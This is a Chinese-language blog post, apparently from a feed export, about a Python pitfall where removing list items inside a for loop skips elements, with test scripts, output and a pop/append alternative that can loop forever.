        <content type="html"><![CDATA[<p>记录下撸脚本的时候处理数据用到dict时的有趣发现</p><a id="more"></a><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>先上</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: dicttest.py@Author: gyy@Time: 6月 08, 2021"""</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">resttask</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"剩余任务：%d 个"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    rest <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        rest<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest1\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>            resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'C++'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果完成就移出此项</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                time <span class="token operator">-=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest2\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 先pop出dict</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Java'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果出错再给它加回进队列</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test1<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test2<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><p>测试结果如下</p><pre class="language-none"><code class="language-none">&#123;&#39;name&#39;: &#39;C&#39;&#125;&#123;&#39;name&#39;: &#39;C++&#39;&#125;&#123;&#39;name&#39;: &#39;Python&#39;&#125;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;&#123;&#39;name&#39;: &#39;go&#39;&#125;&#123;&#39;name&#39;: &#39;Java&#39;&#125;&#123;&#39;name&#39;: &#39;sql&#39;&#125;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!test2new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：7 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：5 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：3 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C&#39;, &#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;All Done!</code></pre><hr><h2 id="任务概况"><a href="#任务概况" class="headerlink" title="任务概况"></a>任务概况</h2><p>这个脚本是为了完成某任务，将所有用户存储在一个list里，即</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>对于此任务，中间过程直接省略，有概率(不可定因素)会失败，所以有补错措施。</p><p>假使本任务补错措施完整，不会出现死循环情况。</p><p>对于本测试，模拟出错记录次数time为2次。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""xxx"""</span></code></pre><p>可见对于list中(下称用户集)的每个dict(下称用户)赋给user，然后进行处理任务(下称任务)，由于<code>while data</code> 必须所有用户全部完成任务才会结束。</p><h4 id="原思想："><a href="#原思想：" class="headerlink" title="原思想："></a>原思想：</h4><p>对于每个用户先全部做一遍任务，然后出错的用户由补错措施补错</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> xxxx<span class="token punctuation">:</span>  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span></code></pre><p>如上，模拟完成任务就从用户集中移出此用户，然后如果有任务出错，用户还在用户集里，输出一行<code>new cycle!==========</code>，继续执行任务。</p><p>然而最终输出却是如下</p><pre class="language-none"><code class="language-none">test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!</code></pre><p>出现了4次<code>new cycle!==========</code></p><h4 id="实际情况："><a href="#实际情况：" class="headerlink" title="实际情况："></a>实际情况：</h4><p>通过debug，可以看到</p><p>第一次：</p><img src="/article/pythondict/image-20210608170630964.png" class="" title="image-20210608170630964" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170648260.png" class="" title="image-20210608170648260" loading="lazy"><p>这里并没有什么异常，我们过四次看看</p><p>第四次：</p><img src="/article/pythondict/image-20210608170759998.png" class="" title="image-20210608170759998" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170807924.png" class="" title="image-20210608170807924" loading="lazy"><p>然后，它竟然跳出了for循环</p><img src="/article/pythondict/image-20210608171051661.png" class="" title="image-20210608171051661" loading="lazy"><p>也就是说<code>for user in data</code>已经走完一遍了</p><p>后面几次同理</p><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>本人才疏学浅，略有拙见，如有错误还请大佬指正！</p><p>经过考虑，觉得原因如下</p><p>python的变量定义并没有那么严格，凭感觉说，像是一种容器。</p><p><code>for user in data</code>，其实就是user代表元素，而它内部有个隐形指针帮助user取元素，它删掉了元素后，迭代器未同步更新，迭代器最后到达list末尾不会报错，从而异常，我们做个小测试</p><pre class="language-python" data-language="python"><code class="language-python">dictlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dictlist<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    dictlist<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>猜猜结果怎么样？</p><details>  <summary>结果如下</summary>{1: 1}{3: 3}{5: 5}{7: 7}</details><p>可见，只输出了单数位</p><p><code>for i in datalist</code>测试<code>datalist</code>里的值</p><p>第一次，即为 <code>datalist[0]</code>（这里不规范地用数组来表示，比较直观）</p><p>有值为{1: 1}，任务进行</p><p>结束后<code>dictlist.remove(i)</code></p><p>此时<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;3: 3&#125;, &#123;4: 4&#125;, &#123;5: 5&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p>第二次为<code>datalist[1]-&gt;&#123;3: 3&#125;</code></p><p>则可以认定，对于dict的remove是即时完成，而i是作为<code>in data</code>的指代，其内部的隐形指针是<code>for(int i=0;i&lt;data.length;i++)</code>的等价代换。(此处的表达并不规范，仅作示意参考)</p><p>当第四次时，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p><code>datalist[3]-&gt;&#123;7: 7&#125;</code>，remove it.</p><p>第五次，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;8: 8&#125;]</code></p><p><code>datalist[4]-&gt;NULL</code>跳出了循环</p><img src="/article/pythondict/image-20210608184852589.png" class="" title="image-20210608184852589" loading="lazy"><h5 id="问题缘由"><a href="#问题缘由" class="headerlink" title="问题缘由"></a>问题缘由</h5><p>写了个小脚本，准备按用户顺序处理任务，结果发现并没有按顺序执行，然后输出cycle后，发现按单数执行了第一遍，进一步深究。发现了这个情况。</p><hr><h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>那如果我直接pop出dict呢？</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>  user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="原思想：-1"><a href="#原思想：-1" class="headerlink" title="原思想："></a>原思想：</h4><p>既然for会有越界问题(似乎Python并不觉得这是个问题hhh)，那么如果换种方式呢。</p><p>每次直接pop出一个用户，然后执行任务，如果出错就把这个用户加回用户集</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span> </code></pre><p>这样一来，确实没啥问题</p><h4 id="实际情况：-1"><a href="#实际情况：-1" class="headerlink" title="实际情况："></a>实际情况：</h4><p>对于本测试，不需要考虑其他因素，而对于撸的那个脚本，一般是不会出错，如果出错应该是一段时间内出错，即无法立刻解决，需要等待（例如这个用户今天不需要执行这个任务，补救达到上限才会执行其他用户任务，会大大拖延脚本的运行速度），这时候如test1先执行其他用户任务即可。</p><p>但在实际脚本中，由于补错措施，程序不写好补错上限就会陷入死循环。</p><h4 id="原因：-1"><a href="#原因：-1" class="headerlink" title="原因："></a>原因：</h4><p>问题在于，pop会弹出用户集最后一个用户，而一旦出现错误，补错措施是将其append回用户集，即还是最后一个用户，这样就会造成死循环</p><p>这里不能用<code>data[&#39;xxx&#39;]=xxx</code>，因为实际dict有很多键值对</p><p>没啥好的根本解决方法，咱不是搞算法和开发的，没有深究这里面的方法，如有方法请师傅们指教。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后脚本还是test1的方式没有变了，既然Python迭代器没有对其做啥表示，咱也就这样用着就好啦</p><p>这是菜鸡摸鱼撸撸小脚本时候遇到的小情况，也算是一个学习记录吧，还没有系统性地学习Python，可能学到了就会有方法可以解决了吧…</p><hr><h2 id="2021-9-15更新"><a href="#2021-9-15更新" class="headerlink" title="2021.9.15更新"></a>2021.9.15更新</h2><p>和Python老师讨论了一下，<code>for i in data</code>的i其实是元素，用<code>type(i)</code>可以得知，能解释的就是还有隐形指针帮助i取元素，而这个隐形指针对i元素在data的表示有着绝对影响，所以在remove后迭代器未及时更新，导致最后到达了list末尾，迭代器正常工作，迭代器退出，程序结束，未报异常，但没有按照我们想让它执行的样子执行，这就是写代码的逻辑和实际运行逻辑的差异吧…</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dozerctf2021</title>
